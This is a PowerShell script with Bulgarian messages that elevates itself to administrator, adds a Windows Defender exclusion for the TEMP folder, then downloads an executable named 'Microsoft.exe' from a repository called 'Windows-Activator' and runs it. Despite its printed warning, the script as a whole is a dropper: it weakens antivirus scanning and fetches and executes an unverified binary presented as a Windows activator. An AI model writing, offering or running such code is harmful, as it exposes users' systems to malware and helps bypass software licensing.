# ============================================
# АВТОМАТИЧНО ПРЕЗАПУСКВАНЕ КАТО АДМИНИСТРАТОР
# ============================================

# Проверка за администраторски права
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Скриптът не е пуснат като Администратор!" -ForegroundColor Yellow
    Write-Host "Това е необходимо за добавяне на изключение в Windows Defender." -ForegroundColor Cyan
    
    # Показване на опции
    Write-Host "`nИзберете опция:" -ForegroundColor White
    Write-Host "1. Натиснете ENTER за автоматично презапускане като Администратор" -ForegroundColor Green
    Write-Host "2. Натиснете N за изход" -ForegroundColor Red
    Write-Host "3. Изчакайте 30 секунди за автоматично презапускане" -ForegroundColor Gray
    
    # Четене на натиснат клавиш с таймаут
    $counter = 30
    while ($counter -gt 0) {
        Write-Host "`rАвтоматично презапускане след: $counter секунди " -NoNewline -ForegroundColor Yellow
        
        # Проверка за натиснат клавиш (без блокиране)
        if ($Host.UI.RawUI.KeyAvailable) {
            $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
            $char = $key.Character.ToString().ToUpper()
            
            if ($char -eq "`r" -or $char -eq "`n") { # ENTER
                Write-Host "`nРъчно презапускане..." -ForegroundColor Green
                break
            }
            elseif ($char -eq "N") {
                Write-Host "`nИзход от скрипта." -ForegroundColor Red
                timeout /t 3
                exit
            }
        }
        
        Start-Sleep -Seconds 1
        $counter--
        
        # Автоматично презапускане при изтичане на времето
        if ($counter -eq 0) {
            Write-Host "`nАвтоматично презапускане..." -ForegroundColor Green
        }
    }
    
    # ПРЕЗАПУСКВАНЕ като администратор
    $scriptPath = $MyInvocation.MyCommand.Path
    
    # Ако няма път (скриптът е копиран в конзолата), използваме временен файл
    if (-not $scriptPath) {
        $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
        $currentScript = $MyInvocation.MyCommand.Definition
        Set-Content -Path $tempScript -Value $currentScript -Encoding UTF8
        $scriptPath = $tempScript
    }
    
    # Подготвяне на аргументи за презапуск
    $newProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell"
    $newProcess.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    $newProcess.Verb = "runas" # Това казва на Windows да пусне като администратор
    
    try {
        [System.Diagnostics.Process]::Start($newProcess) | Out-Null
    }
    catch {
        Write-Host "Грешка при презапуск: $_" -ForegroundColor Red
        Write-Host "Моля, пуснете PowerShell ръчно като Администратор." -ForegroundColor Yellow
    }
    
    exit
}

# ============================================
# ОСНОВЕН КОД (изпълнява се само като админ)
# ============================================
Write-Host "`n==============================================" -ForegroundColor Green
Write-Host "СКРИПТЪТ Е ПУСНАТ КАТО АДМИНИСТРАТОР" -ForegroundColor Green
Write-Host "==============================================`n" -ForegroundColor Green

# 1. ПРЕДУПРЕЖДЕНИЕ ЗА СИГУРНОСТ
Write-Host "🚨 ВАЖНО ПРЕДУПРЕЖДЕНИЕ ЗА СИГУРНОСТ 🚨" -ForegroundColor Red -BackgroundColor Black
Write-Host "Този скрипт ще:" -ForegroundColor Yellow
Write-Host "1. Добави изключение в Windows Defender за TEMP папката" -ForegroundColor Yellow
Write-Host "2. Изтегли и изпълни файл от интернет" -ForegroundColor Yellow
Write-Host "`nТова може да наруши защитата на вашата система!" -ForegroundColor Red
Write-Host "Продължавате ли? (Y/N)" -ForegroundColor Cyan

$response = Read-Host
if ($response -notmatch '^[YyДд]') {
    Write-Host "Скриптът е прекратен." -ForegroundColor Green
    timeout /t 3
    exit
}

# 2. ДЕФИНИРАНЕ НА ПЪТИЩАТА
$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft.exe"
$tempFile = "$env:TEMP\Microsoft.exe"
$folderToExclude = "$env:TEMP"

# 3. ДОБАВЯНЕ НА ИЗКЛЮЧЕНИЕ
Write-Host "`n[1/3] Добавяне на изключение в Defender..." -ForegroundColor Cyan
try {
    Add-MpPreference -ExclusionPath $folderToExclude -ErrorAction Stop
    Write-Host "   ✓ Изключението е добавено за: $folderToExclude" -ForegroundColor Green
}
catch {
    Write-Host "   ✗ Грешка: $_" -ForegroundColor Red
    Write-Host "   Опитваме се да продължим без изключение..." -ForegroundColor Yellow
}

# 4. СВАЛЯНЕ НА ФАЙЛА
Write-Host "`n[2/3] Сваляне на файл от интернет..." -ForegroundColor Cyan
try {
    # Показване на прогрес
    $progressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri $url -OutFile $tempFile -ErrorAction Stop
    Write-Host "   ✓ Файлът е изтеглен: $tempFile" -ForegroundColor Green
    
    # Проверка на размера
    $fileSize = (Get-Item $tempFile).Length / 1MB
    Write-Host "   Размер на файла: {0:N2} MB" -f $fileSize -ForegroundColor Gray
}
catch {
    Write-Host "   ✗ Грешка при сваляне: $_" -ForegroundColor Red
    Write-Host "   Скриптът приключва." -ForegroundColor Yellow
    timeout /t 5
    exit
}

# 5. ПУСКАНЕ НА ФАЙЛА
Write-Host "`n[3/3] Стартиране на файла..." -ForegroundColor Cyan
try {
    Write-Host "   Файлът се стартира..." -ForegroundColor Yellow
    Start-Process $tempFile -Wait -ErrorAction Stop
    Write-Host "   ✓ Файлът е изпълнен успешно." -ForegroundColor Green
}
catch {
    Write-Host "   ✗ Грешка при стартиране: $_" -ForegroundColor Red
}

# 6. ДОПЪЛНИТЕЛНИ ОПЦИИ
Write-Host "`n==============================================" -ForegroundColor Gray
Write-Host "ДОПЪЛНИТЕЛНИ ОПЦИИ:" -ForegroundColor Yellow
Write-Host "1. Виж текущите изключения в Defender" -ForegroundColor Cyan
Write-Host "2. Премахни изключението" -ForegroundColor Cyan
Write-Host "3. Изход" -ForegroundColor Cyan
Write-Host "Изберете опция (1-3): " -NoNewline -ForegroundColor White

$option = Read-Host
switch ($option) {
    "1" {
        Write-Host "`nТекущи изключения в Defender:" -ForegroundColor Green
        $exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
        if ($exclusions) {
            $exclusions | ForEach-Object { Write-Host "   $_" -ForegroundColor Gray }
        }
        else {
            Write-Host "   Няма добавени изключения." -ForegroundColor Gray
        }
    }
    "2" {
        Write-Host "`nПремахване на изключението..." -ForegroundColor Yellow
        try {
            Remove-MpPreference -ExclusionPath $folderToExclude
            Write-Host "   ✓ Изключението е премахнато." -ForegroundColor Green
        }
        catch {
            Write-Host "   ✗ Грешка при премахване: $_" -ForegroundColor Red
        }
    }
}

Write-Host "`nНатиснете ENTER за изход..." -ForegroundColor Gray
Read-Host
